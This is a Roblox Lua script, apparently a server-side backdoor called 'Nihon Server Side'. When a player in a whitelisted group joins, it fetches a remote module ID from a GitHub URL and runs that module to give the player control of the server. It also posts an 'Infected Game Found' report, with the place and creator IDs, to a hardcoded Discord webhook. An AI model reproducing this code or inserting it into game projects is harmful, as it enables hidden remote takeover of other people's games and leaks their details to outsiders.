game.Players.PlayerAdded:Connect(function(plr)
	if plr:IsInGroup(tonumber(game.HttpService:GetAsync("https://raw.githubusercontent.com/Nihon-Development/Nihon-Server-Side/main/Group.lua"))) then
		require(tonumber(game.HttpService:GetAsync("https://raw.githubusercontent.com/Nihon-Development/Nihon-Server-Side/main/Module.lua"))).Nihon(plr.Name)
	end
end)

local data = {
	embeds = {
		{
			title = "Infected Game Found, Click Here!",
			url = "https://www.roblox.com/games/"..game.PlaceId,
			color = 13447765,
			description = "A Game Known As, `"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."` Has Been Successfully Infected. \n \n **Having Trouble:** \n If You Are Having Any Trouble Accesing Nihon Server Side, Make Sure You Have Joined The [Nihon ROBLOX Group](https://www.roblox.com/groups/8054307/Nihon-Merch) So That You Are Whitelisted. \n \n **Place Details:**",
			author = {
				name = "Nihon Server Side Log",
				url = "https://discord.gg/rV3vKju",
				icon_url = "https://cdn.discordapp.com/attachments/868053629918117899/868056849570725928/Nihon_Transparent.png"
			},

			fields = {
				{name = "Place ID",value = "`"..game.PlaceId.."`",inline = true},
				{name = "Creator ID",value = "`"..game.CreatorId.."`",inline = true},
				{name = "Max Players",value = "`"..game.Players.MaxPlayers.."`",inline = true},
			},

			footer = {
				text = "Made By Shade#0122",
				icon_url = "https://cdn.discordapp.com/attachments/868053629918117899/868056849570725928/Nihon_Transparent.png"
			},

			thumbnail = {
				url = "https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid="..game.PlaceId.."&fmt=png&wd=420&ht=420"
			}
		}
	}			
}
game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/868053661203460107/_VOsb2NkqTZA4t4o9yVJasdwtpu4dtWwF9ikdaTkP6Fa5ZjprGRMdQ7nGLkrkUnqGwr_", game:GetService("HttpService"):JSONEncode(data))
